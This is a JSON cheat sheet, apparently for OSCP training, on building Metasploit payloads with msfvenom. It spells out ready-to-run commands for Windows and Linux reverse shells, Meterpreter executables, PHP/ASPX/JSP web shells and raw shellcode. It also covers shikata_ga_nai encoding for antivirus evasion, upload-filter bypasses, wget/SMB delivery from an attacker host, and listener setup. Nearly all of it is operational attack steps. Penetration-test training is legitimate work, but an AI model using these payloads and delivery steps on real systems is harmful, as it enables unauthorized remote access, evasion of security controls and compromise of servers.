{
  "cheatsheets": [
    {
      "id": "metasploit-payloads",
      "name": "Metasploit Payload Generation - msfvenom Guide",
      "description": "Comprehensive msfvenom payload creation for Windows, Linux, and web platforms including encoding, bad character handling, and custom shellcode generation for OSCP scenarios",
      "educational_header": {
        "how_to_recognize": [
          "Need standalone payload for web upload (PHP, ASPX, JSP file)",
          "Compiled binary required for Windows exploitation (EXE, DLL, MSI)",
          "Linux target requires ELF binary or scripting language payload",
          "Web application allows file upload but filters certain file types",
          "Exploit requires custom shellcode with bad character restrictions",
          "AV/EDR detection requires payload encoding or obfuscation"
        ],
        "when_to_look_for": [
          "File upload vulnerability discovered (need PHP/ASPX/JSP shell)",
          "RCE vulnerability confirmed but need payload delivery mechanism",
          "Exploiting buffer overflow with custom shellcode requirements",
          "Social engineering scenario requires executable payload (phishing, USB)",
          "Web shell needed for initial access (unrestricted file upload)",
          "Manual exploitation outside Metasploit framework (nc listener setup)"
        ]
      },
      "scenarios": [
        {
          "title": "Scenario 1: Windows Reverse Shell for File Upload Vulnerability",
          "context": "Discovered unrestricted file upload on Windows IIS server. Can upload EXE files to web-accessible directory (/uploads/). Goal: Generate Windows reverse shell, upload via web form, execute for SYSTEM access.",
          "approach": "Step 1: Generate Windows 64-bit reverse shell: msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.5 LPORT=443 -f exe -o shell.exe. Step 2: Set up netcat listener: nc -lvnp 443 (or use Metasploit handler for Meterpreter). Step 3: Upload shell.exe via web form. Step 4: Browse to http://192.168.45.100/uploads/shell.exe to trigger execution. Step 5: Catch shell on listener. Alternative payload: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.5 LPORT=443 -f exe -o meterpreter.exe (Meterpreter for post-exploitation features, requires multi/handler).",
          "commands": [
            "msfvenom-windows-reverse",
            "msfvenom-windows-meterpreter",
            "msf-handler-setup"
          ],
          "expected_outcome": "msfvenom generates shell.exe (7-15 KB for shell_reverse_tcp, 70-80 KB for meterpreter/reverse_tcp). Upload succeeds (file appears at /uploads/shell.exe). Browsing to URL executes payload, nc listener shows: 'Connection from 192.168.45.100:49234, Microsoft Windows [Version 6.1.7601], C:\\inetpub\\wwwroot\\uploads>'. Shell runs as IIS user (often NETWORK SERVICE or ApplicationPoolIdentity). Upgrade privileges: whoami /priv; if SeImpersonatePrivilege enabled, use Juicy Potato. Time: 2-3 minutes from payload generation to shell access. Common issues: AV detects payload (use encoding: msfvenom -e x86/shikata_ga_nai -i 3), Firewall blocks port 443 outbound (try ports 80, 53, 8080), Browser downloads instead of executes (need different trigger: curl http://192.168.45.100/uploads/shell.exe, or SMB exec: \\\\192.168.45.100\\uploads\\shell.exe).",
          "why_this_works": "msfvenom payload generation: Combines MSF payload with encoder/format in single command, -p specifies payload (windows/x64/shell_reverse_tcp = 64-bit non-staged TCP reverse shell), LHOST/LPORT configure reverse connection (target connects to attacker), -f exe outputs as Windows executable (PE format), -o shell.exe saves to file. Reverse shell mechanics: Payload embedded in EXE as shellcode in .text section, On execution: 1) Resolves ws2_32.dll functions (WSAStartup, connect, recv, send), 2) Creates TCP socket to LHOST:LPORT, 3) Redirects stdin/stdout/stderr to socket, 4) Spawns cmd.exe with handle inheritance, 5) Attacker receives interactive shell. Staged vs non-staged: shell_reverse_tcp (non-staged) = full payload in single stage (~7 KB), meterpreter/reverse_tcp (staged) = small stager + full stage (~300 bytes + 70 KB), Staged requires multi/handler (nc doesn't support staging), Non-staged works with nc or multi/handler. File upload exploitation: Unrestricted upload allows arbitrary file types (EXE, DLL, BAT, VBS), Accessible upload directory enables execution (IIS: /uploads/, Apache: /var/www/html/uploads/), Direct browsing triggers execution if server misconfigured (should return file, not execute), Alternative triggers: LFI (http://target/page.php?file=../uploads/shell.exe), RCE (system('C:\\inetpub\\wwwroot\\uploads\\shell.exe')), SMB execution (from attacker: psexec.py admin:password@192.168.45.100 'C:\\inetpub\\wwwroot\\uploads\\shell.exe'). Port selection strategy: 443 (HTTPS) - often allowed outbound by firewalls, 80 (HTTP) - nearly always allowed, 53 (DNS) - bypasses restrictive rules, 4444 (Metasploit default) - often blocked. OSCP notes: Test payload locally before uploading: wine shell.exe (Linux), .\\shell.exe (Windows VM), Verify listener before triggering (nc listener running first), Encode if AV present: msfvenom -e x86/shikata_ga_nai -i 3 -p windows/shell_reverse_tcp."
        },
        {
          "title": "Scenario 2: Linux ELF Payload for Buffer Overflow Exploitation",
          "context": "Exploiting Linux buffer overflow in vulnerable SUID binary (/usr/local/bin/vuln). Need shellcode that spawns /bin/sh with elevated privileges. Goal: Generate custom ELF payload, deliver via exploit, escalate to root.",
          "approach": "Step 1: Generate Linux 64-bit reverse shell ELF: msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.5 LPORT=4444 -f elf -o exploit.elf. Step 2: Set up listener: nc -lvnp 4444. Step 3: Transfer ELF to target: python3 -m http.server 8000; wget http://192.168.45.5:8000/exploit.elf (from target). Step 4: Make executable: chmod +x exploit.elf. Step 5: Execute: ./exploit.elf. Step 6: Catch shell on listener. Alternative for direct shellcode (buffer overflow): msfvenom -p linux/x64/exec CMD=/bin/sh -f c (outputs C-formatted shellcode for injection). Step 7: Copy shellcode bytes to exploit script: shellcode = b'\\x6a\\x3b\\x58\\x99...'.",
          "commands": [
            "msfvenom-linux-reverse",
            "msfvenom-linux-shellcode"
          ],
          "expected_outcome": "msfvenom generates exploit.elf (300-500 bytes for shell_reverse_tcp). Transfer succeeds via wget or curl. chmod +x sets execute permission. Execution connects back to nc listener: 'Connection from 192.168.45.100:54321, $ id, uid=1000(bob) gid=1000(bob) groups=1000(bob)'. If targeting SUID binary, shell has root privileges: 'uid=0(root) gid=1000(bob) groups=1000(bob)'. Shellcode generation (-f c) produces: 'unsigned char buf[] = \"\\x6a\\x3b\\x58\\x99\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00...\"; (24-48 bytes for exec). Copy to exploit script for buffer overflow. Time: 1-2 minutes for payload generation and transfer. Common issues: ELF wrong architecture (x86 vs x64): file exploit.elf shows ELF 64-bit LSB executable, Target lacks execute permissions on /tmp (use /dev/shm/ instead), Firewall blocks outbound (try bind shell: msfvenom -p linux/x64/shell_bind_tcp LPORT=4444).",
          "why_this_works": "Linux ELF payload structure: ELF header (identifies as Linux executable), .text section (contains shellcode), Entry point (jumps to shellcode on execution). -f elf creates standalone binary (vs raw shellcode), No libc dependencies (pure syscall-based shellcode). Shellcode internals (shell_reverse_tcp): 1) socket() syscall (create TCP socket), 2) connect() syscall (connect to LHOST:LPORT), 3) dup2() syscalls (redirect stdin/stdout/stderr to socket, syscalls 0/1/2), 4) execve('/bin/sh') syscall (spawn shell). Raw shellcode (-f c) for buffer overflows: Outputs hex-encoded bytes without ELF wrapper, Used in exploit scripts: payload = shellcode + padding + return_address, Example buffer overflow: buffer (200 bytes) + shellcode (48 bytes) + padding (152 bytes) + RET (8 bytes) = 408 bytes total. Payload formats: -f elf (standalone executable), -f c (C array for exploit scripts), -f python (Python bytearray), -f raw (raw bytes for socket injection), -f hex (hex string: \\x6a\\x3b...). SUID exploitation: SUID bit (chmod u+s) allows binary to run with owner's privileges (often root), If vulnerable SUID binary exploited with shellcode, shell inherits root privileges, msfvenom payloads preserve SUID context (spawn /bin/sh without dropping privileges). Architecture considerations: Linux x64 uses different syscalls than x86 (execve = syscall 59 on x64, 11 on x86), Use file /bin/bash to detect target architecture: 'ELF 64-bit LSB executable', msfvenom defaults: linux/x64 for 64-bit, linux/x86 for 32-bit. OSCP scenarios: Buffer overflow in SUID binary (custom shellcode), Web application RCE on Linux (ELF upload), Cron job exploitation (replace binary with payload), SSH authorized_keys abuse (upload ELF for persistence). Troubleshooting: ELF not executing: ldd exploit.elf (check missing libraries - should show 'not a dynamic executable'), Shellcode too large for buffer: Use smaller payload: msfvenom -p linux/x64/exec CMD=/bin/sh (24 bytes vs 100+ for reverse shell)."
        },
        {
          "title": "Scenario 3: Web Shells for Multi-Platform Applications",
          "context": "Discovered file upload on web application. Server could be Windows (IIS/ASP.NET) or Linux (Apache/PHP). Upload filter blocks EXE but allows web files (PHP, ASPX, JSP). Goal: Generate appropriate web shell, upload, achieve RCE.",
          "approach": "Step 1: For PHP (Apache/Nginx/IIS): msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.45.5 LPORT=443 -f raw -o shell.php. Step 2: For ASPX (IIS): msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.5 LPORT=443 -f aspx -o shell.aspx. Step 3: For JSP (Tomcat/JBoss): msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.45.5 LPORT=443 -f raw -o shell.jsp. Step 4: Set up Metasploit handler: use exploit/multi/handler; set payload php/meterpreter_reverse_tcp (or windows/meterpreter/reverse_tcp for ASPX); set LHOST 192.168.45.5; set LPORT 443; exploit. Step 5: Upload shell file via web form. Step 6: Browse to uploaded shell: http://192.168.45.100/uploads/shell.php. Step 7: Meterpreter session opens automatically.",
          "commands": [
            "msfvenom-php-shell",
            "msfvenom-aspx-shell",
            "msfvenom-jsp-shell",
            "msf-handler-setup"
          ],
          "expected_outcome": "PHP shell generation: shell.php (1-2 KB) contains obfuscated PHP code. Upload succeeds (bypasses EXE filter). Browsing to http://192.168.45.100/uploads/shell.php triggers PHP execution. Handler receives: '[*] Sending stage (39282 bytes), [*] Meterpreter session 1 opened'. Meterpreter prompt appears with web user privileges (www-data on Linux, IIS APPPOOL on Windows). ASPX shell: shell.aspx (5-10 KB) contains C# code. Executes under IIS application pool identity. JSP shell: shell.jsp (2-3 KB) contains Java code. Executes under Tomcat user (tomcat, tomcat7). Time: 1-2 minutes from generation to shell. Web shell advantages: Bypasses executable upload filters (PHP/ASPX/JSP are 'documents'), Executes on page access (no manual execution trigger), Cross-platform (PHP on Windows/Linux, ASPX on Windows, JSP on any JVM). Common issues: Upload succeeds but shell doesn't execute (file served as text instead of code - check Content-Type header), Handler shows stage sent but no session (firewall blocks reverse connection), Shell detected as malicious (upload blocked by WAF - try encoding or custom shell).",
          "why_this_works": "Web shell mechanics: Server-side scripting languages (PHP, ASP.NET, JSP) execute code on page request, msfvenom embeds Meterpreter payload in valid web file format, On access, server interprets file as code (not static content), Payload executes in context of web server user, Meterpreter connects back to handler. PHP payload internals: -f raw outputs raw PHP (<?php ... ?>), Contains base64-encoded Meterpreter stage, Uses PHP sockets (fsockopen) to connect to LHOST:LPORT, Executes via eval() or system() calls. ASPX payload internals: -f aspx outputs ASP.NET web form (<%@ Page ... %>), Contains C# code in <script runat='server'>, Uses System.Net.Sockets for reverse connection, Compiles at runtime (no DLL needed). JSP payload internals: -f raw outputs Java Server Page (<% ... %>), Uses java.net.Socket for connection, Executes in JVM context (Tomcat, JBoss, WebLogic). Handler requirement: Web shells use Meterpreter (not basic shell), Requires multi/handler with matching payload, PHP uses php/meterpreter_reverse_tcp, ASPX/JSP use windows/meterpreter/reverse_tcp or java/meterpreter/reverse_tcp. File upload filter bypass: Upload filters check: File extension (.exe blocked, .php allowed), MIME type (application/x-msdownload blocked, text/plain allowed), File content signatures (MZ header blocked for EXE). Web shells bypass by: Valid web extension (.php, .aspx, .jsp), Valid MIME type (text/html, application/x-httpd-php), No executable signatures (plain text source code). OSCP scenarios: Unrestricted file upload (direct web shell), Image upload with PHP appended (file.jpg.php, double extension), .htaccess abuse (AddType application/x-httpd-php .jpg - execute images as PHP), Zip upload extraction (shell.php inside archive, extracts to web root). Troubleshooting: Shell uploads but doesn't execute: Check server config (PHP disabled in /uploads/, ASPX not registered), Try different extension (.php5, .phtml for PHP; .asp, .cer for ASPX), Use alternative payload format (WAR for Tomcat: msfvenom -p java/meterpreter/reverse_tcp -f war -o shell.war). File upload size limit: Reduce payload size with encoding: msfvenom -p php/meterpreter_reverse_tcp -e php/base64 (smaller stage)."
        },
        {
          "title": "Scenario 4: Payload Encoding and Bad Character Avoidance",
          "context": "Exploiting Windows buffer overflow. Shellcode injection successful but payload fails to execute. Analysis shows application filters null bytes (\\x00) and line feeds (\\x0a). Goal: Generate shellcode without bad characters, encode for AV evasion.",
          "approach": "Step 1: Identify bad characters through fuzzing: badchars = '\\x00\\x0a\\x0d' (common: null, line feed, carriage return). Step 2: Generate shellcode avoiding bad chars: msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.5 LPORT=443 -f c -b '\\x00\\x0a\\x0d' -e x86/shikata_ga_nai. Step 3: Review output for remaining bad chars: msfvenom shows 'Final size of c file: 368 bytes'. Step 4: If bad chars remain, try different encoder: -e x86/alpha_mixed (alphanumeric only), -e cmd/powershell_base64 (PowerShell). Step 5: Multiple iterations for reliability: -i 5 (encode 5 times for better AV evasion). Step 6: Embed in exploit script: shellcode = (b'\\x89\\xe2\\xda\\xc1\\xd9\\x72...'). Step 7: Test locally before deployment: python exploit.py (verify no crashes from bad chars).",
          "commands": [
            "msfvenom-encode-shikata",
            "msfvenom-badchars",
            "msfvenom-list-encoders"
          ],
          "expected_outcome": "msfvenom with -b '\\x00\\x0a\\x0d' generates shellcode: 'unsigned char buf[] = \"\\xdb\\xc0\\xba\\x4c\\x77\\x2f\\x14\\xd9\\x74\\x24\\xf4...\"'. Output shows: 'Payload size: 368 bytes (after encoding)', 'Final size of c file: 368 bytes', 'Bad characters avoided: \\x00\\x0a\\x0d'. Shikata_ga_nai encoder: Polymorphic (changes each generation), Produces alphanumeric-heavy shellcode, Decodes at runtime (self-decrypting stub). Alternative encoders: x86/alpha_mixed (only A-Z, a-z, 0-9 - large size increase ~2x), x86/call4_dword_xor (XOR encoding, moderate evasion), cmd/powershell_base64 (PowerShell delivery, fully alphanumeric). Multiple iterations (-i 5): Each iteration re-encodes previous output, Increases size but improves AV evasion, Diminishing returns after 3-5 iterations. Time: 5-10 seconds per encoding attempt. Testing: Hex dump payload: xxd -p <<< '$buf', Verify no bad chars: grep '\\x00' (should return nothing). Common issues: Encoded payload too large for buffer (use smaller payload or different encoder), Decoder stub contains bad chars (try -e x86/alpha_mixed), Payload still detected by AV (try -i 10 or custom encoder).",
          "why_this_works": "Bad character filtering: Applications filter inputs: SQL queries filter quotes (', \"), HTTP headers filter line breaks (\\x0a, \\x0d), Buffer overflows may filter null bytes (\\x00 terminates strings in C), Format string attacks filter percent signs (%). Unfiltered shellcode injection fails if payload contains bad chars. msfvenom -b flag: Analyzes payload for specified bytes, Uses encoder to transform payload, Ensures final shellcode doesn't contain bad chars, Adds decoder stub (small assembly code) to decrypt at runtime. Encoder selection: shikata_ga_nai (most common): Polymorphic XOR cipher, Different output each run (defeats signature-based AV), Adds ~20-30 bytes overhead, Decoder stub usually 14 bytes. alpha_mixed: Alphanumeric encoding (A-Z, a-z, 0-9), Avoids ALL non-printable characters, Large size increase (2-3x original), Useful for strict filters (SQL injection, HTTP headers). call4_dword_xor: XOR-based encoding, Moderate evasion, Smaller overhead than shikata. Encoder limitations: Some encoders create bad chars in decoder stub (-b may not eliminate all), Alpha encoders significantly increase payload size (500 bytes → 1500 bytes), Multiple iterations (-i) help but increase size further. Runtime decoding: Encoded payload structure: Decoder stub (assembly code, 10-30 bytes) + Encrypted payload (original shellcode XOR encoded), On execution: 1) CPU executes decoder stub, 2) Decoder decrypts payload in memory, 3) Jumps to decrypted shellcode, 4) Original payload executes. AV evasion strategy: Signatures target known shellcode bytes (Metasploit payloads well-known), Encoding changes byte patterns (defeats static signatures), Multiple iterations change patterns further (-i 5), Polymorphism (shikata) produces unique output each time. OSCP notes: Always specify -b '\\x00' at minimum (null bytes break string-based exploits), Test encoded payload locally before live attempt (avoid burning exploit), Balance size vs evasion (smaller encoder for tight buffers, aggressive encoding for AV), Use xxd or hexdump to verify no bad chars in final payload. Troubleshooting: Decoder stub contains bad chars: msfvenom -b '\\x00' -e x86/alpha_mixed (alphanumeric decoder), Payload too large after encoding: Use smaller base payload: msfvenom -p windows/exec CMD=calc (minimal test payload, ~100 bytes), Try different encoder with less overhead: msfvenom -l encoders (shows size metrics). Buffer overflow testing workflow: 1) Fuzz application to identify bad chars, 2) Generate payload with -b to avoid bad chars, 3) Embed in exploit script with correct offset, 4) Test locally in debugger (gdb, Immunity Debugger), 5) Deploy against target."
        }
      ],
      "sections": [
        {
          "title": "Phase 1: Payload Selection (Match Target Platform)",
          "notes": "Identify target OS and architecture (Windows x86/x64, Linux x86/x64, web platform). Use msfvenom -l payloads | grep <platform> to list options. Common choices: Windows reverse shell (windows/x64/shell_reverse_tcp), Linux reverse shell (linux/x64/shell_reverse_tcp), PHP web shell (php/meterpreter_reverse_tcp), ASPX web shell (windows/meterpreter/reverse_tcp -f aspx). Staged (/) for small size, non-staged (_) for reliability. Estimated time: 1-2 minutes.",
          "commands": [
            "msfvenom-windows-reverse",
            "msfvenom-linux-reverse",
            "msfvenom-php-shell",
            "msfvenom-aspx-shell"
          ]
        },
        {
          "title": "Phase 2: Format and Encoding Configuration",
          "notes": "Select output format: -f exe (Windows executable), -f elf (Linux binary), -f raw (web shells, raw shellcode), -f c (C array for exploit scripts). Add encoding if needed: -e x86/shikata_ga_nai (polymorphic AV evasion), -b '\\x00\\x0a\\x0d' (avoid bad characters), -i 3-5 (multiple encoding iterations). Estimated time: 5-10 seconds per generation.",
          "commands": [
            "msfvenom-encode-shikata",
            "msfvenom-badchars",
            "msfvenom-list-formats"
          ]
        },
        {
          "title": "Phase 3: Handler Setup (If Using Meterpreter)",
          "notes": "Web shells and Meterpreter payloads require multi/handler. Basic shells (shell_reverse_tcp) can use nc listener. Set up handler: use exploit/multi/handler; set payload <matching_payload>; set LHOST <IP>; set LPORT <PORT>; exploit. Match payload exactly (php/meterpreter_reverse_tcp in msfvenom → php/meterpreter_reverse_tcp in handler). Estimated time: 30-60 seconds.",
          "commands": [
            "msf-handler-setup",
            "msf-handler-background"
          ]
        },
        {
          "title": "Phase 4: Delivery and Execution",
          "notes": "Transfer payload to target: HTTP (python3 -m http.server 8000; wget http://<ATTACKER>/shell.exe), SMB (impacket-smbserver share . -smb2support; copy \\\\<ATTACKER>\\share\\shell.exe), Web upload (upload via form), Base64 encoding (certutil -decode shell.b64 shell.exe on Windows). Execute: Windows (shell.exe, powershell -c shell.exe), Linux (chmod +x shell.elf; ./shell.elf), Web (browse to http://target/uploads/shell.php). Estimated time: 2-5 minutes.",
          "commands": [
            "msfvenom-windows-reverse",
            "msfvenom-linux-reverse",
            "msfvenom-php-shell"
          ]
        },
        {
          "title": "Phase 5: Verification and Troubleshooting",
          "notes": "Verify payload execution: Check handler/listener for connection. If no connection: Check firewall (try different port: 80, 443, 53), Verify LHOST correct (ip a on attacker), Test payload locally (wine shell.exe, ./shell.elf), Check AV logs (payload detected). If connection but no session: Payload/handler mismatch (staged vs non-staged), Wrong payload type for handler (shell vs meterpreter). Regenerate payload if needed. Estimated time: 2-10 minutes for troubleshooting.",
          "commands": [
            "msfvenom-windows-reverse",
            "msf-handler-setup"
          ]
        }
      ],
      "tags": [
        "METASPLOIT",
        "MSFVENOM",
        "PAYLOADS",
        "SHELLCODE",
        "ENCODING",
        "WEB_SHELLS",
        "OSCP:HIGH",
        "DELIVERY"
      ]
    }
  ]
}
